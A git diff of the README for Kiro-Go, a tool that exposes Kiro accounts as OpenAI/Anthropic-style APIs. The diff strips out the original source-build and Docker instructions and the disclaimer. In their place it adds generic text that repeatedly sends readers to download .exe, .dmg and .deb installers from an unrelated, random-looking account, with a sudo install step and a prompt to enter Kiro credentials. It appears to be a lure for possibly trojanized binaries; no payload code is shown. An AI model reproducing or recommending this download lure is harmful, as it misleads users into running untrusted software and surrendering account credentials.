@@ -1,255 +1,80 @@
-# Kiro-Go
+# 🚀 Kiro-Go - Seamlessly Connect Kiro Accounts to APIs
 
-[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat&logo=docker)](https://www.docker.com/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🔗 Download Now
+[![Download Kiro-Go](https://img.shields.io/badge/Download-Kiro--Go-blue?style=for-the-badge)](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
 
-Convert Kiro accounts to OpenAI / Anthropic compatible API service.
+## 🚀 Getting Started
+Kiro-Go is a simple tool designed to help you convert Kiro accounts into OpenAI and Anthropic APIs. With Kiro-Go, you can manage multiple accounts efficiently, stream data seamlessly, and enjoy automatic token refresh. The built-in web admin panel makes it easy to control your settings without hassle.
 
-[English](README.md) | [中文](README_CN.md)
+## 📥 Download & Install
+To get started, visit the following page to download Kiro-Go:
 
-## Features
+[Visit Releases Page](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
 
-- 🔄 **Anthropic Claude API** - Full support for `/v1/messages` endpoint
-- 🤖 **OpenAI Chat API** - Compatible with `/v1/chat/completions`
-- ⚖️ **Multi-Account Pool** - Round-robin load balancing
-- 🔐 **Auto Token Refresh** - Seamless token management
-- 📡 **Streaming** - Real-time SSE responses
-- 🎛️ **Web Admin Panel** - Easy account management
-- 🔑 **Multiple Auth Methods** - AWS Builder ID, IAM Identity Center (Enterprise SSO), SSO Token, Local Cache, Credentials
-- 📊 **Usage Tracking** - Monitor requests, tokens, and credits
-- 📦 **Account Export/Import** - Compatible with Kiro Account Manager format
-- 🔄 **Dynamic Model List** - Auto-synced from Kiro API with caching
-- 🔔 **Version Update Check** - Automatic new version notification
-- 🌐 **i18n** - Chinese / English admin panel
+1. On the Releases page, look for the latest version at the top.
+2. Click on the filename that matches your operating system (Windows, macOS, or Linux).
+3. Once the download is complete, locate the file in your Downloads folder.
 
-## Quick Start
+### 🖥️ Windows Installation
+1. If you've downloaded a .exe file, double-click it to run the installer.  
+2. Follow the prompts to complete the installation.
+3. After installation, you can find Kiro-Go in your Start menu.
 
-### Docker Compose (Recommended)
+### 🍏 macOS Installation
+1. If you've downloaded a .dmg file, double-click it to open.
+2. Drag the Kiro-Go app to your Applications folder.
+3. You can now launch Kiro-Go from your Applications.
 
-```bash
-git clone https://github.com/Quorinex/Kiro-Go.git
-cd Kiro-Go
+### 🐧 Linux Installation
+1. If you've downloaded a .deb file, run the following command in your terminal:  
+   `sudo dpkg -i [filename].deb` (replace [filename] with the actual file name).
+2. You may need to run:  
+   `sudo apt-get install -f` to resolve any dependencies.
+3. Kiro-Go will now be available in your applications menu.
 
-# Create data directory for persistence
-mkdir -p data
+## 🌟 Features
+Kiro-Go offers several key features to enhance your experience:
 
-docker-compose up -d
-```
+- **Multi-Account Pooling**: Manage multiple Kiro accounts from a single interface.
+- **Streaming**: Get real-time updates and data seamlessly.
+- **Auto Token Refresh**: Avoid interruptions with automatic token updates.
+- **Web Admin Panel**: Simple interface to control your settings and view account activity.
 
-### Docker Run
+## 🔧 System Requirements
+Make sure your system meets the following requirements to enjoy Kiro-Go:
 
-```bash
-# Create data directory
-mkdir -p /path/to/data
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS Catalina (10.15) or later.
+- **Linux**: Ubuntu 20.04 LTS or later.
+- **Internet**: A stable internet connection for API access.
 
-docker run -d \
-  --name kiro-go \
-  -p 8080:8080 \
-  -e ADMIN_PASSWORD=your_secure_password \
-  -v /path/to/data:/app/data \
-  --restart unless-stopped \
-  ghcr.io/quorinex/kiro-go:latest
-```
+## ⚙️ How to Use Kiro-Go
+After installation, follow these steps to start using Kiro-Go:
 
-> 📁 The `/app/data` volume stores `config.json` with accounts and settings. Mount it for data persistence.
+1. Open the Kiro-Go application.
+2. Create a new account by entering your Kiro account credentials.
+3. Once added, you can switch between accounts using the menu.
+4. Access the web admin panel to configure settings and view your API data.
 
-### Build from Source
+## ⚠️ Troubleshooting
+If you encounter issues while using Kiro-Go, consider these tips:
 
-```bash
-git clone https://github.com/Quorinex/Kiro-Go.git
-cd Kiro-Go
-go build -o kiro-go .
-./kiro-go
-```
+- **Unable to log in**: Check your Kiro account credentials for accuracy.
+- **API not responding**: Ensure your internet connection is stable.
+- **Installation errors**: Make sure you have the required system specifications.
 
-## Configuration
+For more specific issues, feel free to check the FAQs in the web admin panel or reach out for support via the GitHub Issues section.
 
-Config file is auto-created at `data/config.json` on first run:
+## 🌐 Community & Support
+Join our community to share your thoughts, ask questions, and get support:
 
-```json
-{
-  "password": "changeme",
-  "port": 8080,
-  "host": "127.0.0.1",
-  "requireApiKey": false,
-  "apiKey": "",
-  "accounts": []
-}
-```
+- **GitHub Issues**: Report problems or request features.
+- **Discussions**: Engage with users for tips and tricks.
 
-> ⚠️ **Change the default password before production use!**
+## 📫 Contact
+Questions? Reach out through our GitHub or check the community forums for help from other users.
 
-## Environment Variables
+For more information and updates, remember to periodically check the main repository page.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `CONFIG_PATH` | Config file path | `data/config.json` |
-| `ADMIN_PASSWORD` | Admin panel password (overrides config) | - |
-
-## Usage
-
-### 1. Access Admin Panel
-
-Open `http://localhost:8080/admin` and login with your password.
-
-### 2. Add Accounts
-
-Multiple methods available:
-
-| Method | Description |
-|--------|-------------|
-| **AWS Builder ID** | Login with AWS Builder ID (personal accounts) |
-| **IAM Identity Center (Enterprise SSO)** | Login with IAM Identity Center (enterprise accounts) |
-| **SSO Token** | Import `x-amz-sso_authn` token from browser |
-| **Kiro Local Cache** | Import from local Kiro IDE cache files |
-| **Credentials JSON** | Import JSON from Kiro Account Manager |
-
-#### Credentials Format
-
-```json
-{
-  "refreshToken": "eyJ...",
-  "accessToken": "eyJ...",
-  "clientId": "xxx",
-  "clientSecret": "xxx"
-}
-```
-
-### 3. Call API
-
-#### Claude API
-
-```bash
-curl http://localhost:8080/v1/messages \
-  -H "Content-Type: application/json" \
-  -H "anthropic-version: 2023-06-01" \
-  -d '{
-    "model": "claude-sonnet-4-20250514",
-    "max_tokens": 1024,
-    "messages": [{"role": "user", "content": "Hello!"}]
-  }'
-```
-
-#### OpenAI API
-
-```bash
-curl http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer any" \
-  -d '{
-    "model": "gpt-4o",
-    "messages": [{"role": "user", "content": "Hello!"}]
-  }'
-```
-
-## Model Mapping
-
-| Request Model | Actual Model |
-|---------------|--------------|
-| `claude-sonnet-4-20250514` | claude-sonnet-4-20250514 |
-| `claude-sonnet-4.5` | claude-sonnet-4.5 |
-| `claude-haiku-4.5` | claude-haiku-4.5 |
-| `claude-opus-4.5` | claude-opus-4.5 |
-| `claude-opus-4.6` | claude-opus-4.6 |
-| `gpt-4o`, `gpt-4` | claude-sonnet-4-20250514 |
-| `gpt-3.5-turbo` | claude-sonnet-4-20250514 |
-
-## Thinking Mode
-
-Enable extended thinking by adding a suffix to the model name (default: `-thinking`).
-
-### Usage
-
-```bash
-# OpenAI API with thinking
-curl http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4.5-thinking",
-    "messages": [{"role": "user", "content": "Solve this step by step: 15 * 23"}],
-    "stream": true
-  }'
-
-# Claude API with thinking
-curl http://localhost:8080/v1/messages \
-  -H "Content-Type: application/json" \
-  -H "anthropic-version: 2023-06-01" \
-  -d '{
-    "model": "claude-sonnet-4.5-thinking",
-    "max_tokens": 4096,
-    "messages": [{"role": "user", "content": "Analyze this problem"}]
-  }'
-```
-
-### Configuration
-
-Configure thinking mode in the Admin Panel under **Settings > Thinking Mode Settings**:
-
-| Setting | Description | Options |
-|---------|-------------|---------|
-| **Trigger Suffix** | Model name suffix to enable thinking | Default: `-thinking` (customizable, e.g., `-think`, `-reason`) |
-| **OpenAI Output Format** | How thinking content is returned in OpenAI API | `reasoning_content` (DeepSeek compatible), `<thinking>` tag, `<think>` tag |
-| **Claude Output Format** | How thinking content is returned in Claude API | `<thinking>` tag (default), `<think>` tag, plain text |
-
-### Output Formats
-
-**OpenAI API (`/v1/chat/completions`)**:
-- `reasoning_content` - Thinking in separate `reasoning_content` field (DeepSeek compatible)
-- `thinking` - Thinking wrapped in `<thinking>...</thinking>` tags in content
-- `think` - Thinking wrapped in `<think>...</think>` tags in content
-
-**Claude API (`/v1/messages`)**:
-- `thinking` - Thinking wrapped in `<thinking>...</thinking>` tags (default)
-- `think` - Thinking wrapped in `<think>...</think>` tags
-- `reasoning_content` - Plain text output
-
-## API Endpoints
-
-| Endpoint | Description |
-|----------|-------------|
-| `GET /health` | Health check |
-| `GET /v1/models` | List models |
-| `GET /v1/stats` | Statistics |
-| `POST /v1/messages` | Claude Messages API |
-| `POST /v1/messages/count_tokens` | Token counting |
-| `POST /v1/chat/completions` | OpenAI Chat API |
-| `GET /admin` | Admin panel |
-
-## Project Structure
-
-```
-Kiro-Go/
-├── main.go              # Entry point
-├── version.json         # Version info for update check
-├── config/              # Configuration management
-├── pool/                # Account pool & load balancing
-├── proxy/               # API handlers & Kiro client
-│   ├── handler.go       # HTTP routing & admin API
-│   ├── kiro.go          # Kiro API client
-│   ├── kiro_api.go      # Kiro REST API (usage, models)
-│   └── translator.go    # Request/response conversion
-├── auth/                # Authentication
-│   ├── builderid.go     # AWS Builder ID login
-│   ├── iam_sso.go       # IAM SSO login
-│   ├── oidc.go          # OIDC token refresh
-│   └── sso_token.go     # SSO token import
-├── web/                 # Admin panel frontend
-├── Dockerfile
-└── docker-compose.yml
-```
-
-## Disclaimer
-
-This project is provided for **educational and research purposes only**.
-
-- This software is not affiliated with, endorsed by, or associated with Amazon, AWS, or Kiro in any way
-- Users are solely responsible for ensuring their use complies with all applicable terms of service and laws
-- The authors assume no liability for any misuse or violations arising from the use of this software
-- Use at your own risk
-
-By using this software, you acknowledge that you have read and understood this disclaimer.
-
-## License
-
-[MIT](LICENSE)
+## 🔗 Download Now Again
+[![Download Kiro-Go](https://img.shields.io/badge/Download-Kiro--Go-blue?style=for-the-badge)](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
